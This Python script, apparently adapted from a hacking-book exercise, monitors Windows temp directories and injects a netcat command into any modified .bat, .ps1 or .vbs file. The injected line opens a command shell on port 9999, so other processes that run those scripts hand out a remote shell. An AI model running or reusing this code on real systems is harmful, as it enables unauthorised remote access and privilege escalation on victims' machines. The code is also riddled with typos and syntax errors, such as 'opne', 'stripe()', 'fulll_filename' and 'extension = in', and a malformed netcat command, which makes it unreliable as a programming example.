# Modified example thath is originally given here:
# http://timgolden.me.uk/python/win_32_how_do_i/watch_directory_for_changes.html
import os
import tempfile
import threading
import win32con
import win32file

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

FILE_LIST_DIRECTORY = 0x0001
PATHS = ['C:\\WINDOWS\\TEMP', tempfile.gettempdir()]
NETCAT = 'C:\\' # directory of netcat.exe
TGT_IP = 'ip'   # ip address of lhost
CMD = f'{NETCAT} -t {TGT_IP} - 9999 -l -c '
FILE_TYPES = {
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'], 
    '.ps1': ["\r\n#bhpmaerker\r\n", f'\r\nStart-Proces "{CMD}"\r\n'], 
    '.vbs': ["\r\n'bhpmarker\r\n", 
    f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
    }

def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].stripe() in contents:
        return

    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with opne(full_filename, 'w') as f:
        f.write(full_contents)
    print('\\o/ Injected Code')


def monitor(path_to_watch):
    h_directory = win32file.CreateFile(path_to_watch, FILE_LIST_DIRECTORY, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE, None, win32con.OPEN_EXISTING, win32con.FILE_FLAG_BACKUP_SEMANTICS, None)
    while True:
        try:
            results = win32file.ReadDirectoryChangesW(h_directory, 1024, True, win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES | win32con.FILE_NOTIFY_CHANGE_DIR_NAME | win32con.FILE_NOTIFY_CHANGE_FILE_NAME | win32con.FILE_NOTIFY_CHANGE_LAST_WRITE | win32con.FILE_NOTIFY_CHANGE_SECURITY | win32con.FILE_NOTIFY_CHANGE_SIZE, None, None)
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')
                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')
                elif action == FILE_MODIFIED:
                    extension = os.path.splitext(full_filename)[1]

                if extension = in FILE_TYPES:
                    try:
                        print(f'[*] Modified {full_filename}')
                        print('[vvv] Dumping contents ... ')
                        with open(full_filename) as f:
                            contents = f.read()
                        inject_code(fulll_filename, contents, extension)
                        print(contents)
                        print('[^^^] Dump complete.')
                    except Exception as e:
                        print(f'[!!!] Dump failed. {e}')

                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknown action on {full_filename}')
            except Exception:
                pass

if __name__ == '__main__':
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path,))
        monitor_thread.start()

